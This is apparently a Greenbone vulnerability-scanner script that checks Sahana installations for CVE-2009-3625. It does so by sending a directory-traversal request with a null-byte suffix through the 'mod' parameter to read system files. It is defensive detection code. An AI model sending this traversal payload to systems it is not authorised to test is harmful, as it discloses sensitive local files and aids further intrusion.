# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100336");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-11-04 12:36:10 +0100 (Wed, 04 Nov 2009)");
  script_cve_id("CVE-2009-3625");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Sahana 'mod' Parameter Local File Disclosure Vulnerability");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_dependencies("sahana_detect.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("sahana/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36826");
  script_xref(name:"URL", value:"https://bugzilla.redhat.com/show_bug.cgi?id=530255");
  script_xref(name:"URL", value:"http://www.sahana.lk/");
  script_xref(name:"URL", value:"http://sourceforge.net/mailarchive/forum.php?thread_name=5d9043b70910191044l4bb0178fs563a5128a0f5db01%40mail.gmail.com&forum_name=sahana-maindev");

  script_tag(name:"solution", value:"Updates are available. Please see the references for details.");

  script_tag(name:"summary", value:"Sahana is prone to a local file-disclosure vulnerability because it
  fails to adequately validate user-supplied input.");

  script_tag(name:"impact", value:"Sahana 0.6.2.2 is vulnerable. Other versions may also be affected.");

  script_tag(name:"affected", value:"An attacker can exploit this vulnerability to obtain potentially
  sensitive information from local files on computers running the vulnerable application. This may aid in further attacks.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

CPE = "cpe:/a:sahana:sahana";

if(!port = get_app_port(cpe:CPE)) exit(0);
if(!dir = get_app_location(cpe:CPE, port:port)) exit(0);
if(dir == "/") dir = "";

files = traversal_files();

foreach file (keys(files)) {

  url = string(dir, "/index.php?stream=text&mod=/../../../../../../../../../../../", files[file], "%00");
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
  if(!buf) continue;

  if(egrep(pattern:file, string:buf, icase:TRUE)) {
    report = http_report_vuln_url(url:url, port:port);
    security_message(port:port, data:report);
    exit(0);
  }
}

exit(99);
